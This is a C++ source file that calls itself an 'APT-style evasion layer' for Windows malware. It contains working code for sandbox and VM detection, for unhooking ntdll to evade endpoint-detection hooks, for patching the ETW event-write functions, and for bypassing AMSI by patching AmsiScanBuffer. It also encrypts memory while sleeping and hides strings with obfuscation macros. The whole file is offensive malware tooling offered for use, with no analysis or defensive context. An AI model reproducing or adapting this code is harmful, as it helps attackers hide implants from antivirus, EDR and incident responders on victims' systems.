// APT-style evasion layer - implementation
#include "evasion.h"
#include "syscalls.h"
#include "spoof.h"
#include "crypto.h"
#include "obf.h"
#include <cstring>
#include <string>
#include <vector>

// page-aligned protection flip via indirect syscalls + patch + restore
static bool patch_bytes(PVOID addr, const void* patch, size_t n) {
    const uintptr_t page = 0x1000;
    uintptr_t start = (uintptr_t)addr;
    uintptr_t end = start + n;
    PVOID base = (PVOID)(start & ~(page - 1));
    SIZE_T region = (((end + page - 1) & ~(page - 1)) - (uintptr_t)base);

    ULONG old = 0;
    if (sc::NtProtectVirtualMemory(GetCurrentProcess(), &base, &region, PAGE_READWRITE, &old) != 0)
        return false;
    memcpy(addr, patch, n);
    sc::NtProtectVirtualMemory(GetCurrentProcess(), &base, &region, old, &old);
    FlushInstructionCache(GetCurrentProcess(), addr, n);
    return true;
}

namespace ev {

bool is_sandbox() {
    SYSTEM_INFO si{};
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) {
        OutputDebugStringA("sandbox: cpu<2");
        return true;
    }

    MEMORYSTATUSEX ms{};
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
        OutputDebugStringA("sandbox: ram<2GB");
        return true;
    }

    if (GetTickCount64() < 10 * 60 * 1000ULL) {
        OutputDebugStringA("sandbox: uptime<10min");
        return true;
    }

    char host[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD hn = sizeof(host);
    if (GetComputerNameA(host, &hn)) {
        std::string low = host;
        for (auto& c : low) c = (char)tolower(c);
        const std::string bad[] = {
            XS("sandbox").get(), XS("virus").get(), XS("malware").get(),
            XS("sample").get(),  XS("test").get(),  XS("vm").get()};
        for (auto& b : bad) {
            if (low.find(b) != std::string::npos) {
                OutputDebugStringA("sandbox: hostname");
                return true;
            }
        }
    }
    return false;
}

bool unhook_ntdll() {
    std::string name = XS("ntdll").get();
    HMODULE ntdll = GetModuleHandleA(name.c_str());
    if (!ntdll) return false;

    char sysdir[MAX_PATH];
    if (!GetSystemDirectoryA(sysdir, MAX_PATH)) return false;
    std::string path = std::string(sysdir) + XS("\\ntdll.dll").get();

    HANDLE hf = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) return false;
    DWORD size = GetFileSize(hf, nullptr);
    std::vector<BYTE> disk(size);
    DWORD rd = 0;
    BOOL ok = ReadFile(hf, disk.data(), size, &rd, nullptr);
    CloseHandle(hf);
    if (!ok || rd != size) return false;

    auto* dos = (IMAGE_DOS_HEADER*)disk.data();
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto* nt = (IMAGE_NT_HEADERS*)(disk.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    IMAGE_SECTION_HEADER* text = nullptr;
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++)
        if (memcmp(sec[i].Name, ".text", 5) == 0) { text = &sec[i]; break; }
    if (!text) return false;

    BYTE* mem_text = (BYTE*)ntdll + text->VirtualAddress;
    BYTE* disk_text = disk.data() + text->PointerToRawData;

    // restore only bytes that differ from the pristine image
    DWORD first = text->SizeOfRawData, last = 0, count = 0;
    for (DWORD i = 0; i < text->SizeOfRawData; i++) {
        if (mem_text[i] != disk_text[i]) {
            if (i < first) first = i;
            if (i > last) last = i;
            count++;
        }
    }
    if (!count) return true;

    const uintptr_t page = 0x1000;
    uintptr_t start = (uintptr_t)(mem_text + first);
    uintptr_t end = (uintptr_t)(mem_text + last) + 1;
    PVOID base = (PVOID)(start & ~(page - 1));
    SIZE_T region = (((end + page - 1) & ~(page - 1)) - (uintptr_t)base);

    ULONG old = 0;
    if (sc::NtProtectVirtualMemory(GetCurrentProcess(), &base, &region, PAGE_READWRITE, &old) != 0)
        return false;
    for (DWORD i = first; i <= last; i++)
        if (mem_text[i] != disk_text[i]) mem_text[i] = disk_text[i];
    sc::NtProtectVirtualMemory(GetCurrentProcess(), &base, &region, old, &old);
    FlushInstructionCache(GetCurrentProcess(), mem_text + first, last - first + 1);
    return true;
}

// trampoline patch: 5-byte jmp (E9 rel32) to a clean-return stub on a RX page.
// The inline "mov eax,..; ret" pattern is a well-known AV signature; the
// jmp approach also leaves the original body intact below the stub.
static bool trampoline_patch(PVOID addr, const BYTE* stub_code, size_t stub_n) {
    PVOID tgt = spoof::build_patch_target(stub_code, stub_n);
    if (!tgt) return false;
    BYTE jmp[5] = {0xE9, 0, 0, 0, 0};
    *(DWORD*)(jmp + 1) = (DWORD)((uintptr_t)tgt - (uintptr_t)addr - 5);
    return patch_bytes(addr, jmp, sizeof(jmp));
}

bool patch_etw() {
    const std::string names[] = {
        XS("EtwEventWrite").get(), XS("EtwEventWriteEx").get(), XS("EtwEventWriteFull").get()};
    BYTE stub[] = {0x33, 0xC0, 0xC3}; // xor eax, eax; ret
    bool any = false;
    HMODULE ntdll = GetModuleHandleA(XS("ntdll").get().c_str());
    for (auto& name : names) {
        FARPROC fn = GetProcAddress(ntdll, name.c_str());
        if (fn && trampoline_patch((PVOID)fn, stub, sizeof(stub))) any = true;
    }
    return any;
}

bool bypass_amsi() {
    std::string dll = XS("amsi.dll").get();
    std::string fnname = XS("AmsiScanBuffer").get();
    HMODULE amsi = LoadLibraryA(dll.c_str());
    if (!amsi) return false;
    FARPROC fn = GetProcAddress(amsi, fnname.c_str());
    if (!fn) return false;
    BYTE stub[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}; // mov eax, 0x80070057; ret
    return trampoline_patch((PVOID)fn, stub, sizeof(stub));
}

void obfuscate_sleep(DWORD ms, void* buf, size_t size) {
    if (ms == 0) return;
    if (!buf || size == 0 || size > 16 * 1024 * 1024) {
        Sleep(ms);
        return;
    }
    std::string raw((char*)buf, size);
    std::string enc;
    if (!crypto_encrypt(raw, enc)) {
        Sleep(ms);
        return;
    }
    SecureZeroMemory(buf, size);
    Sleep(ms);
    std::string dec;
    if (crypto_decrypt(enc, dec)) {
        size_t n = dec.size() < size ? dec.size() : size;
        memcpy(buf, dec.data(), n);
    }
    SecureZeroMemory(enc.data(), enc.size());
}

}
